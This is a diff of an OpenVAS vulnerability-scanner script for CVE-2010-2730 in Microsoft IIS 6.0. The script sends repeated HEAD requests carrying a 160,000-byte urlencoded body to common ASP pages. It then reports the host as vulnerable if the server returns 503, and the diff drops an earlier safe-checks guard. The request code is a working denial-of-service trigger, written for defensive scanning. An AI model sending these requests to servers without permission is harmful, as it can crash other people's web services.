@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_ms_iis_bof_vuln.nasl 8250 2017-12-27 07:29:15Z teissa $
+# $Id: gb_ms_iis_bof_vuln.nasl 10826 2018-08-08 07:30:42Z cfischer $
 #
 # Microsoft IIS ASP Stack Based Buffer Overflow Vulnerability
 #
@@ -24,88 +24,82 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-tag_impact = "Successful exploitation will let the remote unauthenticated attackers to force
-  the IIS server to become unresponsive until the IIS service is restarted manually
-  by the administrator.
-  Impact Level: Application";
-tag_affected = "Microsoft Internet Information Services version 6.0";
-tag_insight = "The flaw is due to a stack overflow error in the in the IIS worker
-  process which can be exploited using a crafted POST request to hosted 'ASP'
-  pages.";
-tag_solution = "Run Windows Update and update the listed hotfixes or download and
-  update mentioned hotfixes in the advisory from the below link,
-  http://www.microsoft.com/technet/security/bulletin/ms10-065.mspx";
-tag_summary = "The host is running Microsoft IIS Webserver and is prone to
-  stack based buffer overflow vulnerability.";
+CPE = "cpe:/a:microsoft:iis";
 
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.801520");
-  script_version("$Revision: 8250 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-12-27 08:29:15 +0100 (Wed, 27 Dec 2017) $");
+  script_version("$Revision: 10826 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-08 09:30:42 +0200 (Wed, 08 Aug 2018) $");
   script_tag(name:"creation_date", value:"2010-10-08 08:29:14 +0200 (Fri, 08 Oct 2010)");
   script_bugtraq_id(43138);
   script_cve_id("CVE-2010-2730");
   script_tag(name:"cvss_base", value:"9.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
   script_name("Microsoft IIS ASP Stack Based Buffer Overflow Vulnerability");
-  script_xref(name : "URL" , value : "http://bug.zerobox.org/show-2780-1.html");
-  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/15167/");
-  script_xref(name : "URL" , value : "http://www.deltadefensesystems.com/blog/?p=217");
-
-  script_tag(name:"qod_type", value:"remote_vul");
   script_category(ACT_DENIAL);
   script_copyright("Copyright (c) 2010 Greenbone Networks GmbH");
   script_family("Web Servers");
   script_dependencies("secpod_ms_iis_detect.nasl");
   script_require_ports("Services/www", 80);
-  script_tag(name : "impact" , value : tag_impact);
-  script_tag(name : "affected" , value : tag_affected);
-  script_tag(name : "insight" , value : tag_insight);
-  script_tag(name : "solution" , value : tag_solution);
-  script_tag(name : "summary" , value : tag_summary);
+  script_mandatory_keys("IIS/installed");
+
+  script_xref(name:"URL", value:"http://bug.zerobox.org/show-2780-1.html");
+  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15167/");
+  script_xref(name:"URL", value:"http://www.deltadefensesystems.com/blog/?p=217");
+  script_xref(name:"URL", value:"http://www.microsoft.com/technet/security/bulletin/ms10-065.mspx");
+
+  script_tag(name:"impact", value:"Successful exploitation will let the remote unauthenticated attackers to force
+  the IIS server to become unresponsive until the IIS service is restarted manually by the administrator.
+
+  Impact Level: Application");
+
+  script_tag(name:"affected", value:"Microsoft Internet Information Services version 6.0");
+
+  script_tag(name:"insight", value:"The flaw is due to a stack overflow error in the in the IIS worker
+  process which can be exploited using a crafted POST request to hosted 'ASP' pages.");
+
+  script_tag(name:"solution", value:"Run Windows Update and update the listed hotfixes or download and
+  update mentioned hotfixes in the advisory from the below link, 
+
+  http://www.microsoft.com/technet/security/bulletin/ms10-065.mspx");
+
+  script_tag(name:"summary", value:"The host is running Microsoft IIS Webserver and is prone to
+  stack based buffer overflow vulnerability.");
+
+  script_tag(name:"solution_type", value:"VendorFix");
+  script_tag(name:"qod_type", value:"remote_vul");
+
   exit(0);
 }
-
 
 include("http_func.inc");
+include("http_keepalive.inc");
+include("host_details.inc");
 
-iisPort = get_http_port(default:80);
-if(!iisPort){
-  exit(0);
-}
+if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
+if( ! get_app_location( cpe:CPE, port:port ) ) exit( 0 );
 
-iisVer = get_kb_item("IIS/" + iisPort + "/Ver");
-if(!iisVer){
-  exit(0);
-}
+foreach file( make_list( "/login.asp", "/index.asp", "/default.asp" ) ) {
 
-if(!safe_checks()){
-  exit(0);
-}
+  for( i = 0; i < 10; i++ ) {
 
-## checking for possible default files
-foreach files (make_list("login.asp", "index.asp", "default.asp"))
-{
-  for(i=0; i<10; i++)
-  {
-    ## Construct the request
-    string = crap(data:"C=A&", length:160000);
+    string = crap( data:"C=A&", length:160000 );
 
-    ## send the crafted request multiple times
-    request = string("HEAD /", files, " HTTP/1.1 \r\n",
-                     "Host: ", get_host_name(), "\r\n",
-                     "Connection:Close \r\n",
-                     "Content-Type: application/x-www-form-urlencoded \r\n",
-                     "Content-Length:", strlen(string),"\r\n\r\n", string);
-    response = http_send_recv(port:iisPort, data:request);
+    req = string("HEAD ", file, " HTTP/1.1 \r\n",
+                 "Host: ", get_host_name(), "\r\n",
+                 "Connection:Close \r\n",
+                 "Content-Type: application/x-www-form-urlencoded \r\n",
+                 "Content-Length:", strlen(string),"\r\n\r\n", string);
+    res = http_send_recv( port:port, data:req );
 
-    ## Check the service status after exploit
-    if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 503 .*", string:response) &&
-                    ("Service Unavailable" >< response))
-    {
-      security_message(port:iisPort);
-      exit(0);
+    if( ereg( pattern:"^HTTP/[0-9]\.[0-9] 503 .*", string:res ) &&
+        ( "Service Unavailable" >< res ) ) {
+      report = report_vuln_url( port:port, url:file );
+      security_message( port:port, data:report );
+      exit( 0 );
     }
   }
 }
+
+exit( 99 );
